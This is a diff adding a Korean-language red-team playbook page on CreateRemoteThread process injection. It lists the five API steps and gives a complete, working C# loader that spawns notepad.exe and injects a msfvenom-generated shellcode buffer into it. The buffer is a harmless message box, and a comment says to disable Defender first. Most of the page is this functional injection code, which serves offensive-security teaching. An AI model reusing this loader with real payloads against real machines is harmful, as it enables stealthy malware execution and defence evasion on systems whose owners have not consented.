@@ -1,0 +1,148 @@
+# CreateRemoteThread
+
+CreateRemoteThread 인젝션은 원격 프로세스에 쓰레드를 만들어 공격자의 쉘코드를 실행시키는 전통적인 프로세스 인젝션 방법 중 하나다.
+
+### 실행 단계
+
+1. OpenProcess - 원격 프로세스의 핸들을 얻는다
+2. VirtualAllocEx - 원격 프로세스에 메모리를 할당한다
+3. WriteProcessMemory - 할당된 메모리에 쉘코드를 쓴다
+4. VirtualProtectEx - 할당된 메모리 권한을 RX로 바꾼다
+5. 원격 프로세스에 쓰레드를 생성해 해당 쓰레드가 쉘코드를 실행하게끔 한다
+
+### 코드
+
+[레드팀 플레이북 프로세스 인젝션 깃허브](https://github.com/ChoiSG/RTPProcessInjection)
+
+<details>
+
+<summary>CreateRemoteThread.cs</summary>
+
+```csharp
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+// 1. Turn off defender 
+// 2. Use cmd/powershell/terminal to execute this. Don't execute inside visual studio!
+
+namespace CreateRemoteThread
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            // msfvenom -p windows/x64/messagebox text="stage0 shellcode" title="choi redteam playbook" -f csharp
+            byte[] buf = new byte[306] {
+                0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,
+                0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,
+                0x8b,0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,0x3e,0x48,
+                0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,
+                0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,
+                0x48,0x8b,0x52,0x20,0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,
+                0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,0x8b,0x48,
+                0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x5c,0x48,0xff,0xc9,0x3e,
+                0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,
+                0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,
+                0x08,0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
+                0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x3e,
+                0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,
+                0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
+                0x59,0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x49,0xc7,0xc1,
+                0x00,0x00,0x00,0x00,0x3e,0x48,0x8d,0x95,0xfe,0x00,0x00,0x00,0x3e,0x4c,0x8d,
+                0x85,0x0f,0x01,0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,
+                0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x73,0x74,0x61,
+                0x67,0x65,0x30,0x20,0x73,0x68,0x65,0x6c,0x6c,0x63,0x6f,0x64,0x65,0x00,0x63,
+                0x68,0x6f,0x69,0x20,0x72,0x65,0x64,0x74,0x65,0x61,0x6d,0x20,0x70,0x6c,0x61,
+                0x79,0x62,0x6f,0x6f,0x6b,0x00 };
+
+            var process = Process.Start(@"C:\windows\system32\notepad.exe");
+            var pid = process.Id;
+
+            IntPtr hProc = OpenProcess(ProcessAccessFlags.All, false, pid);
+            IntPtr pAlloc = VirtualAllocEx(hProc, IntPtr.Zero, (uint)buf.Length, (uint)(AllocationType.Commit | AllocationType.Reserve), (uint)MemoryProtection.ReadWrite);
+            bool rWPM = WriteProcessMemory(hProc, pAlloc, buf, (uint)buf.Length, out IntPtr byteWritten);
+            bool rVPE = VirtualProtectEx(hProc, pAlloc, (uint)buf.Length, (uint)MemoryProtection.ExecuteRead, out uint lpflOldProtect);
+            IntPtr hThread = CreateRemoteThread(hProc, IntPtr.Zero, (uint)0, pAlloc, IntPtr.Zero, (uint)0, out IntPtr lpThreadId);
+
+            Console.WriteLine("[+] Process handle = {0}", hProc.ToInt64().ToString("x2"));
+            Console.WriteLine("[+] Allocated memory address = 0x{0}", pAlloc.ToInt64().ToString("x2"));
+            Console.WriteLine("[+] WriteProcessMemory result = {0}", rWPM.ToString());
+            Console.WriteLine("[+] VirtualProtectExe result = {0}", rVPE.ToString());
+            Console.WriteLine("[+] Thread handle = {0}", hThread.ToInt64().ToString("x2"));
+        }
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
+
+        [DllImport("kernel32.dll")]
+        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);
+
+        [Flags]
+        public enum ProcessAccessFlags : uint
+        {
+            All = 0x001F0FFF,
+            Terminate = 0x00000001,
+            CreateThread = 0x00000002,
+            VirtualMemoryOperation = 0x00000008,
+            VirtualMemoryRead = 0x00000010,
+            VirtualMemoryWrite = 0x00000020,
+            DuplicateHandle = 0x00000040,
+            CreateProcess = 0x000000080,
+            SetQuota = 0x00000100,
+            SetInformation = 0x00000200,
+            QueryInformation = 0x00000400,
+            QueryLimitedInformation = 0x00001000,
+            Synchronize = 0x00100000
+        }
+
+        [Flags]
+        public enum AllocationType
+        {
+            Commit = 0x1000,
+            Reserve = 0x2000,
+            Decommit = 0x4000,
+            Release = 0x8000,
+            Reset = 0x80000,
+            Physical = 0x400000,
+            TopDown = 0x100000,
+            WriteWatch = 0x200000,
+            LargePages = 0x20000000
+        }
+
+        [Flags]
+        public enum MemoryProtection
+        {
+            Execute = 0x10,
+            ExecuteRead = 0x20,
+            ExecuteReadWrite = 0x40,
+            ExecuteWriteCopy = 0x80,
+            NoAccess = 0x01,
+            ReadOnly = 0x02,
+            ReadWrite = 0x04,
+            WriteCopy = 0x08,
+            GuardModifierflag = 0x100,
+            NoCacheModifierflag = 0x200,
+            WriteCombineModifierflag = 0x400
+        }
+    }
+}
+
+```
+
+</details>
+
+위 코드는 `notepad.exe` 프로세스를 실행한 뒤, `CreateRemoteThread` 프로세스 인젝션을 실행한다.
+
+코드를 보면 OpenProcess -> VirtualAllocEx -> WriteProcessMemory -> VirtualProtectEx -> CreateRemoteThread 의 흐름을 따라가고 있다.
+
+![](<../../.gitbook/assets/image (91).png>)
